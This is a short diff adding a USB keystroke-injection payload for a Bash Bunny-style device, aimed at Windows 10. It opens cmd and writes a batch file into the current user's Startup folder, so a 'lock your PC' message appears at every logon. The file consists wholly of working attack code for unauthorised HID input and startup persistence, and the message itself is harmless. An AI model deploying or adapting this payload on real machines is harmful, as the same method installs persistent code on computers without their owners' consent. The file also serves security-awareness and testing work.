@@ -1,0 +1,30 @@
+#!/bin/bash
+#Title: Startup-Message
+#Author: By MikeeU
+#Target: Windows
+#Tested on: Windows 10
+#Version: 1.0
+
+#Setting up(Magenta)
+LED SETUP
+
+
+ATTACKMODE HID
+
+#Beginning HID Attack(Yellow)
+LED ATTACK
+
+#Running cmd to create file in startup directory
+RUN WIN cmd
+Q STRING "cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+Q ENTER
+Q STRING "echo @echo off > startup.bat"
+Q ENTER
+Q STRING "echo echo I will lock my PC next time! >> startup.bat"
+Q ENTER
+Q STRING "echo pause >> startup.bat"
+Q ENTER
+Q ALT F4
+
+#Fast green followed by Solid -> Finished
+LED FINISH
